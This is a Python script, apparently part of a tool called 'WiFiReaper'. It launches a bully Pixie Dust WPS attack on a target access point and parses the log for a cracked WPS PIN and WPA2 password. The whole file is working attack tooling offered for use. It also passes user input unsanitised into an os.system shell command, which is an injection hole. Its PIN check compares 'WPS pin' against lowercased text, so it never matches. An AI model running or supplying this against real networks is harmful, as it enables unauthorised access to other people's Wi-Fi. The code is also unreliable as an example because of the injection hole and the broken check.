import subprocess
import os
import re
from datetime import datetime

def run_bully_pixie(iface, bssid, channel=None):
    """
    Launches a Pixie Dust WPS attack using bully and logs the output.
    """
    log_file = f"output/pixie_{bssid.replace(':','')}_{datetime.now().strftime('%Y%m%d-%H%M%S')}.log"
    os.makedirs("output", exist_ok=True)

    if channel:
        print(f"[+] Setting interface {iface} to channel {channel}")
        os.system(f"iw dev {iface} set channel {channel}")

    print(f"[+] Starting Bully Pixie Dust attack on {bssid}")
    print(f"[*] Logging to {log_file}\n")

    try:
        with open(log_file, "w") as log:
            subprocess.run(
                ["bully", iface, "-b", bssid, "-p", "-v", "3"],
                stdout=log,
                stderr=subprocess.STDOUT
            )
    except KeyboardInterrupt:
        print("\n[-] Attack interrupted.")
        return

    print(f"[✔] Attack complete. Checking for results...\n")
    extract_results(log_file)

def extract_results(log_file):
    """
    Parses the bully log file for WPS PIN and WPA2 passphrase.
    """
    pin = None
    passphrase = None

    with open(log_file, "r") as f:
        for line in f:
            if "WPS pin" in line.lower():
                pin_match = re.search(r'WPS pin:\s*([0-9]+)', line, re.IGNORECASE)
                if pin_match:
                    pin = pin_match.group(1)
            if "WPA PSK" in line or "WPA2 passphrase" in line:
                pass_match = re.search(r'passphrase:\s*(.*)', line)
                if pass_match:
                    passphrase = pass_match.group(1).strip()

    if pin:
        print(f"[🔓] WPS PIN Cracked: {pin}")
    if passphrase:
        print(f"[🔐] WPA2 Password: {passphrase}")
    if not pin and not passphrase:
        print("[-] No WPS PIN or WPA2 password recovered.")
        print("[*] Target may not be vulnerable to Pixie Dust.")

# Optional CLI usage for standalone testing
if __name__ == "__main__":
    os.system("clear")
    print("== WiFiReaper - Pixie Dust WPS Attack ==")
    iface = input("Enter monitor mode interface (e.g., wlan0mon): ").strip()
    bssid = input("Enter target BSSID (AP MAC): ").strip()
    channel = input("Enter channel (leave blank to skip): ").strip()
    channel = channel if channel else None
    run_bully_pixie(iface, bssid, channel)
